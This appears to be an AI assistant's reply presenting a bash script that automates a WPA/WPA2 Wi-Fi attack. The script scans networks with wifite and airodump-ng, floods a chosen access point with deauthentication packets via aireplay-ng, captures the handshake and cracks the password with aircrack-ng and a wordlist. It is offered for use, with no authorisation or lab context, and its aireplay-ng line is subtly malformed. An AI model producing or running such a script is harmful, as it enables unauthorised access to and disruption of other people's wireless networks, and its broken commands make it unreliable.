Here’s a formatted bash script based on the provided commands:

#!/bin/bash

# Initial Scan
echo "Performing initial scan..."
sudo wifite -all
echo "Scanning for nearby Wi-Fi networks..."
sudo airodump-ng wlan0
echo "Scanning a specific channel and saving output to file..."
read -p "Enter the channel number: " channel
read -p "Enter the AP MAC address: " ap_mac
sudo airodump-ng -c $channel -w airdump.txt -d $ap_mac wlan0

# Wi-Fi Scan
echo "Capturing a wider scan of nearby Wi-Fi networks..."
sudo airodump-ng -w wider_scan_capture wlan0 
echo "Capturing a scan of a specific AP..."
read -p "Enter the AP MAC address: " ap_mac
sudo airodump-ng -w ap_scan_capture wlan0 -d $ap_mac

# Deauthentication and Handshake Capture
echo "Sending deauthentication packets to the target AP..."
read -p "Enter the AP MAC address: " ap_mac
read -p "Enter the channel number: " channel
sudo aireplay-ng -0 0 -a $ap_mac -c wlan0
echo "Capturing handshake packets..."
sudo airodump-ng -w deauth_capture -c $channel -d $ap_mac wlan0

# Password Cracking
echo "Cracking the WPA/WPA2 password..."
read -p "Enter the path to the wordlist file: " wordlist
sudo aircrack-ng deauth_capture-01.cap -w $wordlist
